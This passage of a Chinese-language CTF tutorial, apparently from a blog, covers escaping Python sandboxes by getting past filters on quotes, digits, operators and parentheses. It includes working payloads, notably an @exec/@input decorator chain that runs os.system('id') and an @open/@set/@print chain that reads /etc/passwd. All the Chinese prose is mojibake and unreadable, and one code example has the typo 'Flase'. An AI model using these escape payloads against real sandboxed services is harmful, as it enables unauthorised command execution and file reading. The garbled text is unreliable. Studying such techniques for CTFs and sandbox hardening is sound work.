<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">56</span>)</span><br><span class="line"><span class="string">&#x27;8&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">100</span>)</span><br><span class="line"><span class="string">&#x27;d&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">100</span>)*<span class="number">40</span></span><br><span class="line"><span class="string">&#x27;dddddddddddddddddddddddddddddddddddddddd&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="list-dict-æ„é€ ä»»æ„å­—ç¬¦ä¸²"><a href="#list-dict-æ„é€ ä»»æ„å­—ç¬¦ä¸²" class="headerlink" title="list + dict æ„é€ ä»»æ„å­—ç¬¦ä¸²"></a>list + dict æ„é€ ä»»æ„å­—ç¬¦ä¸²</h3><p>ä½¿ç”¨ dict å’Œ list è¿›è¡Œé…åˆå¯ä»¥å°†å˜é‡åè½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œä½†è¿™ç§æ–¹å¼çš„å¼Šç«¯åœ¨äºå­—ç¬¦ä¸²ä¸­ä¸èƒ½æœ‰ç©ºæ ¼ç­‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="doc"><a href="#doc" class="headerlink" title="__doc__"></a><code>__doc__</code></h3><p><code>__doc__</code> å˜é‡å¯ä»¥è·å–åˆ°ç±»çš„è¯´æ˜ä¿¡æ¯ï¼Œä»å…¶ä¸­ç´¢å¼•å‡ºæƒ³è¦çš„å­—ç¬¦ç„¶åè¿›è¡Œæ‹¼æ¥å°±å¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__doc__.find(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]</span><br><span class="line"><span class="string">&#x27;sys&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="bytes-å‡½æ•°"><a href="#bytes-å‡½æ•°" class="headerlink" title="bytes å‡½æ•°"></a>bytes å‡½æ•°</h3><p>bytes å‡½æ•°å¯ä»¥æ¥æ”¶ä¸€ä¸ª ascii åˆ—è¡¨ï¼Œç„¶åè½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå†è°ƒç”¨ decode åˆ™å¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()</span><br><span class="line"><span class="string">&#x27;system&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="è¿‡æ»¤äº†-2"><a href="#è¿‡æ»¤äº†-2" class="headerlink" title="è¿‡æ»¤äº† +"></a>è¿‡æ»¤äº† +</h2><p>è¿‡æ»¤äº† + å·ä¸»è¦å½±å“åˆ°äº†æ„é€ å­—ç¬¦ä¸²ï¼Œå‡å¦‚é¢˜ç›®è¿‡æ»¤äº†å¼•å·å’ŒåŠ å·ï¼Œæ„é€ å­—ç¬¦ä¸²è¿˜å¯ä»¥ä½¿ç”¨ <code>join</code> å‡½æ•°ï¼Œåˆå§‹çš„å­—ç¬¦ä¸²å¯ä»¥é€šè¿‡ <code>str()</code> è¿›è¡Œè·å–.å…·ä½“çš„å­—ç¬¦ä¸²å†…å®¹å¯ä»¥ä» <code>__doc__</code> ä¸­å–ï¼Œ</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>().join((().__doc__[<span class="number">19</span>],().__doc__[<span class="number">23</span>]))</span><br><span class="line"><span class="string">&#x27;se&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(<span class="built_in">dict</span>(s_t_r=<span class="number">1</span>))[<span class="number">0</span>][::<span class="number">2</span>]</span><br><span class="line"><span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="è¿‡æ»¤äº†æ•°å­—"><a href="#è¿‡æ»¤äº†æ•°å­—" class="headerlink" title="è¿‡æ»¤äº†æ•°å­—"></a>è¿‡æ»¤äº†æ•°å­—</h2><p>å¦‚æœè¿‡æ»¤äº†æ•°å­—çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›å‡½æ•°çš„è¿”å›å€¼è·å–ã€‚ä¾‹å¦‚ï¼š </p>
<ul>
<li>0ï¼š<code>int(bool([]))</code>ã€<code>Flase</code>ã€<code>len([])</code>ã€<code>any(())</code></li>
<li>1ï¼š<code>int(bool([&quot;&quot;]))</code>ã€<code>True</code>ã€<code>all(())</code>ã€<code>int(list(list(dict(aá=())).pop()).pop())</code></li>
</ul>
<p>æœ‰äº† 0 ä¹‹åï¼Œå…¶ä»–çš„æ•°å­—å¯ä»¥é€šè¿‡è¿ç®—è¿›è¡Œè·å–ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 ** 0 == 1</span><br><span class="line">1 + 1 == 2</span><br><span class="line">2 + 1 == 3</span><br><span class="line">2 ** 2 == 4</span><br></pre></td></tr></table></figure></div>

<p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ repr è·å–ä¸€äº›æ¯”è¾ƒé•¿å­—ç¬¦ä¸²ï¼Œç„¶åä½¿ç”¨ len è·å–å¤§æ•´æ•°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="literal">True</span>))</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="built_in">bytearray</span>))</span><br><span class="line"><span class="number">19</span></span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ len + dict + list æ¥æ„é€ ,è¿™ç§æ–¹å¼å¯ä»¥é¿å…è¿ç®—ç¬¦çš„çš„å‡ºç°</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 -&gt; len([])</span><br><span class="line">2 -&gt; len(list(dict(aa=()))[len([])])</span><br><span class="line">3 -&gt; len(list(dict(aaa=()))[len([])])</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬å››ç§æ–¹æ³•: unicode ä¼šåœ¨åç»­çš„ unicode ç»•è¿‡ä¸­ä»‹ç»</p>
<h2 id="è¿‡æ»¤äº†ç©ºæ ¼"><a href="#è¿‡æ»¤äº†ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤äº†ç©ºæ ¼"></a>è¿‡æ»¤äº†ç©ºæ ¼</h2><p>é€šè¿‡ ()ã€[] æ›¿æ¢</p>
<h2 id="è¿‡æ»¤äº†è¿ç®—ç¬¦"><a href="#è¿‡æ»¤äº†è¿ç®—ç¬¦" class="headerlink" title="è¿‡æ»¤äº†è¿ç®—ç¬¦"></a>è¿‡æ»¤äº†è¿ç®—ç¬¦</h2><h3 id="åŸºç¡€ç­‰ä»·ï¼ˆå€¼ç­‰ä»·ä½†æ— çŸ­è·¯ï¼‰"><a href="#åŸºç¡€ç­‰ä»·ï¼ˆå€¼ç­‰ä»·ä½†æ— çŸ­è·¯ï¼‰" class="headerlink" title="åŸºç¡€ç­‰ä»·ï¼ˆå€¼ç­‰ä»·ä½†æ— çŸ­è·¯ï¼‰"></a>åŸºç¡€ç­‰ä»·ï¼ˆå€¼ç­‰ä»·ä½†æ— çŸ­è·¯ï¼‰</h3><blockquote>
<p>Pythoné‡Œ <code>bool</code> æ˜¯ <code>int</code> çš„å­ç±»ï¼š<code>True==1</code>, <code>False==0</code>ã€‚å› æ­¤å¾ˆå¤šç®—æœ¯&#x2F;ä½è¿ç®—éƒ½èƒ½â€œå‡‘â€å‡ºç›¸åŒå¸ƒå°”ç»“æœï¼Œä½†<strong>ä¸¤è¾¹éƒ½ä¼šè¢«æ±‚å€¼</strong>ã€‚</p>
</blockquote>
<ul>
<li><code>A or B</code><ul>
<li><code>A | B</code></li>
<li><code>A + B</code>ï¼ˆç»“æœæ˜¯ <code>0/1/2</code>ï¼›<code>bool(...)</code> åæ‰æ˜¯å¸ƒå°”ï¼‰</li>
<li><code>bool(A) or bool(B)</code> â†’ è‹¥ <code>or</code> è¢«ç¦ï¼Œç”¨ <code>bool(A) | bool(B)</code></li>
</ul>
</li>
<li><code>A and B</code><ul>
<li><code>A &amp; B</code></li>
<li><code>A * B</code>ï¼ˆ0&#x2F;1ï¼›<code>bool(...)</code> åç­‰ä»·ï¼‰</li>
</ul>
</li>
<li><code>A xor B</code><ul>
<li><code>A ^ B</code></li>
</ul>
</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> a,b <span class="keyword">in</span> [(<span class="number">1</span>,<span class="number">1</span>),(<span class="number">1</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">1</span>),(<span class="number">0</span>,<span class="number">0</span>)]:</span><br><span class="line">    A,B = <span class="built_in">bool</span>(a), <span class="built_in">bool</span>(b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(A|B) == (A <span class="keyword">or</span> B), <span class="built_in">bool</span>(A*B) == (A <span class="keyword">and</span> B), <span class="built_in">bool</span>(A^B) == (A^B))</span><br></pre></td></tr></table></figure></div>

<p>âš ï¸ æ³¨æ„ï¼š</p>
<ul>
<li><code>| &amp; ^ + *</code> <strong>æ²¡æœ‰çŸ­è·¯</strong>ï¼›å³ä¾§è¡¨è¾¾å¼ä¸€å®šä¼šæ‰§è¡Œï¼ˆå‰¯ä½œç”¨ä¼šå‘ç”Ÿï¼‰ã€‚</li>
<li>å¯¹è‡ªå®šä¹‰å¯¹è±¡ï¼Œè¿™äº›è¿ç®—ä¼šè°ƒç”¨ <code>__or__/__and__/__xor__/__add__</code> ç­‰ï¼Œå¯èƒ½<strong>ä¸æ˜¯å¸ƒå°”é€»è¾‘</strong>ã€‚</li>
</ul>
<h3 id="é€»è¾‘å€¼â€œè¿”å›è¯­ä¹‰â€å¤åˆ»ï¼ˆçŸ­è·¯å€¼è¯­ä¹‰ï¼‰"><a href="#é€»è¾‘å€¼â€œè¿”å›è¯­ä¹‰â€å¤åˆ»ï¼ˆçŸ­è·¯å€¼è¯­ä¹‰ï¼‰" class="headerlink" title="é€»è¾‘å€¼â€œè¿”å›è¯­ä¹‰â€å¤åˆ»ï¼ˆçŸ­è·¯å€¼è¯­ä¹‰ï¼‰"></a>é€»è¾‘å€¼â€œè¿”å›è¯­ä¹‰â€å¤åˆ»ï¼ˆçŸ­è·¯å€¼è¯­ä¹‰ï¼‰</h3><blockquote>
<p><code>or</code> è¿”å›ç¬¬ä¸€ä¸ªçœŸå€¼æˆ–æœ€åä¸€ä¸ªï¼›<code>and</code> è¿”å›ç¬¬ä¸€ä¸ªå‡å€¼æˆ–æœ€åä¸€ä¸ªã€‚<br> å¯ä»¥ç”¨â€œç´¢å¼•å°æŠ€å·§â€åœ¨**ä¸å†™ <code>or/and</code>**çš„æƒ…å†µä¸‹å¤åˆ»å…¶è¿”å›è¯­ä¹‰ï¼ˆä¸”ä¸éœ€è¦ä¸‰ç›®ï¼‰ã€‚</p>
</blockquote>
<ul>
<li><p><code>X or Y</code>ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(X, Y)[<span class="number">1</span> - <span class="built_in">int</span>(<span class="built_in">bool</span>(X))]   <span class="comment"># X çœŸâ†’å–ç´¢å¼•0â†’Xï¼›X å‡â†’å–ç´¢å¼•1â†’Y</span></span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœä¸èƒ½å†™å‡æ³•ï¼Œæ¢ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Y, X)[<span class="built_in">bool</span>(X)]            <span class="comment"># X çœŸâ†’å–ç´¢å¼•1â†’Xï¼›X å‡â†’å–ç´¢å¼•0â†’Yï¼ˆæ¬¡åºè°ƒæ¢ä¸€ä¸‹ï¼‰</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>X and Y</code>ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(X, Y)[<span class="built_in">int</span>(<span class="built_in">bool</span>(X))]       <span class="comment"># X çœŸâ†’å– Yï¼›X å‡â†’å– X</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>è‹¥ <strong>çœŸçš„éœ€è¦çŸ­è·¯å‰¯ä½œç”¨</strong>ï¼ˆåªåœ¨å¿…è¦æ—¶æ±‚å€¼ï¼‰ï¼Œå¯ä»¥æŠŠå³å€¼åŒ…æˆ <code>lambda</code>ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># X and f()  =&gt;  X çœŸæ—¶æ‰è°ƒç”¨ f</span></span><br><span class="line">(<span class="keyword">lambda</span>: X, <span class="keyword">lambda</span>: f())[<span class="built_in">int</span>(<span class="built_in">bool</span>(X))]()</span><br><span class="line"><span class="comment"># X or f()   =&gt;  X å‡æ—¶æ‰è°ƒç”¨ f</span></span><br><span class="line">(<span class="keyword">lambda</span>: X, <span class="keyword">lambda</span>: f())[<span class="number">1</span> - <span class="built_in">int</span>(<span class="built_in">bool</span>(X))]()</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="â€œnotâ€-çš„æ›¿ä»£"><a href="#â€œnotâ€-çš„æ›¿ä»£" class="headerlink" title="â€œnotâ€ çš„æ›¿ä»£"></a>â€œnotâ€ çš„æ›¿ä»£</h3><p><code>not B</code>ï¼š</p>
<ul>
<li><code>1 - int(bool(B))</code></li>
<li><code>bool(B) ^ 1</code></li>
<li><code>(~bool(B)) &amp; 1</code>  ï¼ˆä½å–åå†æˆªæ–­åˆ° 0&#x2F;1ï¼‰</li>
</ul>
<h3 id="â€œ-â€-çš„æ›¿ä»£"><a href="#â€œ-â€-çš„æ›¿ä»£" class="headerlink" title="â€œ&#x3D;&#x3D; &#x2F; !&#x3D;â€ çš„æ›¿ä»£"></a>â€œ&#x3D;&#x3D; &#x2F; !&#x3D;â€ çš„æ›¿ä»£</h3><ul>
<li><code>x == y</code>ï¼š<ul>
<li><code>x in (y,)</code> &#x2F; <code>x in [y]</code> &#x2F; <code>&#123;y&#125;.__contains__(x)</code></li>
<li><code>not (x != y)</code> â†’ ç”¨ä¸Šé¢çš„ <code>not</code> æ›¿ä»£æ–¹æ¡ˆ</li>
<li>è‹¥å…è®¸æ¯”è¾ƒè¿ç®—ï¼š<code>(x &lt;= y) &amp; (y &lt;= x)</code>ï¼ˆå¯¹ä¸å¯æ¯”è¾ƒç±»å‹è¦å°å¿ƒå¼‚å¸¸ï¼‰</li>
</ul>
</li>
<li><code>x != y</code>ï¼š<ul>
<li><code>x not in (y,)</code> å¯èƒ½ä¹Ÿè¢«è¿‡æ»¤ï¼›å¯ç”¨ <code>1 - int(x in (y,))</code></li>
</ul>
</li>
</ul>
<h3 id="ç»„åˆé€»è¾‘çš„ç­‰ä»·"><a href="#ç»„åˆé€»è¾‘çš„ç­‰ä»·" class="headerlink" title="ç»„åˆé€»è¾‘çš„ç­‰ä»·"></a>ç»„åˆé€»è¾‘çš„ç­‰ä»·</h3><ul>
<li><code>(A and B) or C</code>ï¼š<ul>
<li><code>bool(A&amp;B) | bool(C)</code></li>
</ul>
</li>
<li><code>A or (B and C)</code>ï¼š<ul>
<li><code>bool(A) | bool(B&amp;C)</code></li>
</ul>
</li>
</ul>
<blockquote>
<p>ä¸€å®šè®°å¾—<strong>åŠ æ‹¬å·</strong>ï¼Œå› ä¸ºä½è¿ç®—ä¼˜å…ˆçº§å’Œé€»è¾‘è¿ç®—ä¸åŒï¼š<br> <code>~</code> &gt; <code>**</code> &gt; <code>* / %</code> &gt; <code>+ -</code> &gt; <code>&lt;&lt; &gt;&gt;</code> &gt; <code>&amp;</code> &gt; <code>^</code> &gt; <code>|</code> &gt; æ¯”è¾ƒ&#x2F;é€»è¾‘</p>
</blockquote>
<h3 id="å†…ç½®å‡½æ•°æ›¿ä»£"><a href="#å†…ç½®å‡½æ•°æ›¿ä»£" class="headerlink" title="å†…ç½®å‡½æ•°æ›¿ä»£"></a>å†…ç½®å‡½æ•°æ›¿ä»£</h3><p><code>map(func, iterable)</code> çš„æ„æ€æ˜¯ï¼š<strong>æŠŠ iterableï¼ˆå¯è¿­ä»£å¯¹è±¡ï¼Œæ¯”å¦‚åˆ—è¡¨ï¼‰é‡Œçš„æ¯ä¸ªå…ƒç´ ï¼Œä¾æ¬¡äº¤ç»™ <code>func</code> å¤„ç†ï¼Œå¹¶è¿”å›ä¸€ä¸ªç»“æœåºåˆ—</strong>ã€‚</p>
<p>å› æ­¤ <code>map(bool, [...])</code> ç›¸å½“äºå°†åˆ—è¡¨ä¸­çš„æ¯ä¸ªæˆå‘˜çš„å€¼éƒ½è½¬æ¢ä¸º <code>bool</code> ç±»å‹ã€‚ä¹‹åå€ŸåŠ© <code>any</code>&#x2F;<code>all</code> å®ç°é€»è¾‘è¿ç®—ã€‚ </p>
<ul>
<li>å¤šä¸ª <code>or</code>ï¼š<code>any([A,B,C])</code> â†’ è¢«è¿‡æ»¤å¯ç”¨ <code>sum(map(bool, ...)) &gt; 0</code></li>
<li>å¤šä¸ª <code>and</code>ï¼š<code>all([A,B,C])</code> â†’ è¢«è¿‡æ»¤å¯ç”¨ <code>min(map(int, ...)) == 1</code></li>
</ul>
<h2 id="è¿‡æ»¤äº†-3"><a href="#è¿‡æ»¤äº†-3" class="headerlink" title="è¿‡æ»¤äº† ()"></a>è¿‡æ»¤äº† ()</h2><h3 id="åˆ©ç”¨è£…é¥°å™¨"><a href="#åˆ©ç”¨è£…é¥°å™¨" class="headerlink" title="åˆ©ç”¨è£…é¥°å™¨ @"></a>åˆ©ç”¨è£…é¥°å™¨ <code>@</code></h3><p>åœ¨ Python ä¸­ï¼Œè£…é¥°å™¨æ˜¯ç”¨ <code>@</code> ç¬¦å·å£°æ˜çš„ï¼Œå¹¶ä¸”è¢«ç”¨æ¥ä¿®æ”¹ç±»æˆ–å‡½æ•°çš„è¡Œä¸ºã€‚ä¸€èˆ¬æ¥è¯´ï¼Œ<strong>è£…é¥°å™¨æ¥å—ä¸€ä¸ªå‡½æ•°æˆ–ç±»ä½œä¸ºå‚æ•°ï¼Œåšä¸€äº›å¤„ç†åè¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•°æˆ–ç±»ã€‚</strong></p>
<p>ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@D1</span></span><br><span class="line"><span class="meta">@D2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™æ®µä»£ç çš„å«ä¹‰æ˜¯ï¼š**<code>class A</code> å…ˆè¢« <code>D2</code> è£…é¥°å™¨ä¿®é¥°ï¼Œå†è¢« <code>D1</code> è£…é¥°å™¨ä¿®é¥°**ã€‚ä¹Ÿå°±æ˜¯ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A = D1(D2(A))</span><br></pre></td></tr></table></figure></div>

<p>ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸‹é¢è¿™æ®µä»£ç åœ¨æ—  <code>()</code> çš„æƒ…å†µä¸‹å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:<span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œè¿‡ç¨‹æ˜¯ï¼š</p>
<ol>
<li><strong>å…ˆåˆ›å»ºç±»å¯¹è±¡</strong><ul>
<li>è§£é‡Šå™¨å…ˆæ‰§è¡Œ <code>class a: pass</code> çš„ç±»ä½“ï¼Œå¾—åˆ°ç±»å¯¹è±¡ <code>&lt;class &#39;__main__.a&#39;&gt;</code>ã€‚</li>
</ul>
</li>
<li><strong>å‡†å¤‡è£…é¥°å™¨å¯è°ƒç”¨</strong><ul>
<li>è§£æè£…é¥°å™¨è¡¨è¾¾å¼ï¼Œæ‹¿åˆ°ä¸¤ä¸ªå¯è°ƒç”¨ï¼š<code>builtins.input</code> å’Œ <code>builtins.exec</code>ã€‚</li>
<li>æ³¨æ„ï¼šæ­¤æ—¶æ‹¿çš„æ˜¯å¯¹è±¡æœ¬èº«ï¼Œå¹¶æ²¡æœ‰è°ƒç”¨ã€‚</li>
</ul>
</li>
<li><strong>è‡ªä¸‹è€Œä¸Šåº”ç”¨è£…é¥°å™¨</strong><ul>
<li>è§„åˆ™ï¼š<code>@D1 @D2</code> ç­‰ä»·äº <code>a = D1(D2(a))</code>ï¼Œæ‰€ä»¥å…ˆåº”ç”¨ <code>@input</code>ï¼Œå†åº”ç”¨ <code>@exec</code>ã€‚</li>
</ul>
</li>
<li><strong>åº”ç”¨ <code>@input</code>ï¼ˆæœ€å†…å±‚ï¼‰</strong><ul>
<li>å®é™…æ‰§è¡Œï¼š<code>tmp = input(a)</code></li>
<li>è¿™é‡Œ <code>input</code> çš„<strong>æç¤ºä¸²</strong>æ˜¯ <code>str(a)</code>ï¼Œä¹Ÿå°±æ˜¯ <code>&quot;&lt;class &#39;__main__.a&#39;&gt;&quot;</code>ï¼Œæ‰€ä»¥ä½ çœ‹åˆ°æç¤ºã€‚</li>
<li>ä½ åœ¨æç¤ºåè¾“å…¥äº†ä¸€è¡Œï¼š<code>__import__(&#39;os&#39;).system(&quot;id&quot;)</code></li>
<li>å› è€Œ <code>tmp</code> ç°åœ¨æ˜¯è¿™ä¸ª<strong>å­—ç¬¦ä¸²</strong>ï¼š<code>&quot;__import__(&#39;os&#39;).system(\&quot;id\&quot;)&quot;</code></li>
</ul>
</li>
<li><strong>åº”ç”¨ <code>@exec</code>ï¼ˆå¤–å±‚ï¼‰</strong><ul>
<li>å®é™…æ‰§è¡Œï¼š<code>result = exec(tmp)</code></li>
<li><code>exec</code> ä¼šæŠŠä¸Šä¸€æ­¥çš„å­—ç¬¦ä¸²<strong>å½“ä½œ Python ä»£ç æ‰§è¡Œ</strong>ï¼Œäºæ˜¯è¿è¡Œäº† <code>os.system(&quot;id&quot;)</code>ï¼Œä½ çœ‹åˆ° <code>uid=...</code> çš„è¾“å‡ºã€‚</li>
</ul>
</li>
<li><strong>ç»‘å®šå›åå­— <code>a</code></strong><ul>
<li>æœ€ç»ˆèµ‹å€¼ï¼š<code>a = result</code>ï¼Œå› ä¸º <code>exec</code> <strong>æ²¡æœ‰è¿”å›å€¼</strong>ï¼Œå› æ­¤ **<code>a</code> è¢«ç»‘å®šä¸º <code>None</code>**ï¼ˆåŸæœ¬çš„ç±»å¯¹è±¡ä¸å†ç»‘å®šåœ¨ <code>a</code> ä¸Šï¼‰ã€‚</li>
</ul>
</li>
</ol>
<p>åŒç†æˆ‘ä»¬è¿˜å¯ä»¥æ„é€ å‡ºä»»æ„åœ°å€è¯»å†™çš„ payloadï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@print</span></span><br><span class="line"><span class="meta">@set</span></span><br><span class="line"><span class="meta">@open</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:<span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>é‡Šå™¨å…ˆæ‰§è¡Œ <code>class a: pass</code>ï¼Œå¾—åˆ°ç±»å¯¹è±¡ <code>&lt;class &#39;__main__.a&#39;&gt;</code>ã€‚</p>
</li>
<li><p>åº”ç”¨æœ€å†…å±‚è£…é¥°å™¨ <code>@input </code>è°ƒç”¨ <code>input(a)</code>ï¼Œè¿™ä¼šæŠŠç±»å¯¹è±¡ <code>a</code> è½¬æˆå­—ç¬¦ä¸²ï¼Œä½œä¸º <code>input</code> çš„æç¤ºç¬¦ï¼š<code>&lt;class &#39;__main__.a&#39;&gt;</code>ã€‚å‡è®¾ä½ è¾“å…¥ï¼š<code>/etc/passwd</code>ï¼Œåˆ™ <code>input</code> è¿”å›å­—ç¬¦ä¸² <code>&quot;/etc/passwd&quot;</code>ã€‚</p>
</li>
<li><p>åº”ç”¨ <code>@open</code>ï¼Œè°ƒç”¨ <code>open(&quot;/etc/passwd&quot;)</code> ä»¥é»˜è®¤æ¨¡å¼ <code>&#39;r&#39;</code> æ‰“å¼€æ–‡ä»¶ï¼Œè¿”å›ä¸€ä¸ª<strong>æ–‡ä»¶å¯¹è±¡</strong>ï¼ˆå¯è¿­ä»£ï¼Œæ¯æ¬¡è¿­ä»£æ˜¯ä¸€è¡Œï¼‰ã€‚</p>
</li>
<li><p>åº”ç”¨ <code>@set</code>ï¼Œè°ƒç”¨ <code>set(&lt;file object&gt;)</code> æŠŠæ–‡ä»¶å¯¹è±¡è¿­ä»£çš„æ‰€æœ‰è¡Œè¯»å‡ºæ¥ï¼Œæ”¾è¿›ä¸€ä¸ªé›†åˆï¼ˆå»é‡ã€æ— åºï¼‰ã€‚è¿”å›å€¼æ˜¯ä¸€ä¸ª <code>set</code>ï¼Œå†…å®¹æ˜¯æ–‡ä»¶çš„æ‰€æœ‰è¡Œã€‚</p>
<blockquote>
<p>Python å†…ç½®çš„ <code>set</code> æ˜¯ä¸€ä¸ª<strong>å¯è¿­ä»£å¯¹è±¡çš„æ„é€ å™¨</strong>ï¼Œä½œç”¨æ˜¯ä»ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼ˆiterableï¼‰æ„é€ ä¸€ä¸ª<strong>é›†åˆ</strong>ç±»å‹ï¼ˆå»é‡ã€æ— åºï¼‰ã€‚</p>
<p>Python é‡Œçš„<strong>æ–‡ä»¶å¯¹è±¡</strong>ï¼ˆ<code>_io.TextIOWrapper</code>ï¼‰å®ç°äº†è¿­ä»£åè®®ï¼š</p>
<ul>
<li><p>å®ƒæœ‰ <code>__iter__</code> æ–¹æ³•ï¼Œè¿”å›è‡ªå·±</p>
</li>
<li><p>å®ƒæœ‰ <code>__next__</code> æ–¹æ³•ï¼Œæ¯æ¬¡ <code>next()</code> è¿”å›æ–‡ä»¶ä¸­çš„ä¸‹ä¸€è¡Œ</p>
</li>
</ul>
